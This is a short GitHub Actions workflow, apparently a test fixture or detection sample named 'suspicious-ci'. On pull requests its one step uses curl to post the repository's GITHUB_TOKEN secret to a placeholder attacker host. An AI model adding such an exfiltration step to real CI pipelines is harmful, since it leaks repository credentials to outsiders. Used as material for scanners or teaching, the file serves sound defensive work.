name: suspicious-ci

on:
  pull_request:

jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - name: suspicious upload
        run: |
          curl -X POST https://attacker.invalid/collect -d "${{ secrets.GITHUB_TOKEN }}"

